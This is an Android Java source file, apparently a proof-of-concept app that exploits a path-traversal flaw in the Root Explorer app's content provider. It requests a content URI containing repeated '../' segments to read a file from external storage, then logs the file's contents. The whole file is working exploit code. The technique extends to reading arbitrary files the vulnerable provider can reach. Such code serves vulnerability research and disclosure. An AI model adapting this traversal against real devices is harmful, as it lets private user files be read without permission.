package com.wnagzihxa1n.pocapk;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;


public class MainActivity extends Activity {

    static final String TAG = "toT0C";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        FileInputStream fileInputStream = null;
        ContentResolver contentResolver = getContentResolver();
        try {
            try {
                fileInputStream = new FileInputStream(new File("/sdcard/Poc"));
                if (fileInputStream != null) {
                    byte[] data = new byte[fileInputStream.available()];
                    fileInputStream.read(data);
                    Log.i(TAG, new String(data));
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            try {
                Uri uri = Uri.parse("content://com.speedsoftware.rootexplorer.content/../../../../../../../sdcard/Poc");
                fileInputStream = (FileInputStream) contentResolver.openInputStream(uri);
                if (fileInputStream != null) {
                    byte[] data = new byte[fileInputStream.available()];
                    fileInputStream.read(data);
                    Log.i(TAG, new String(data));
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (fileInputStream != null) {
                    fileInputStream.close();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}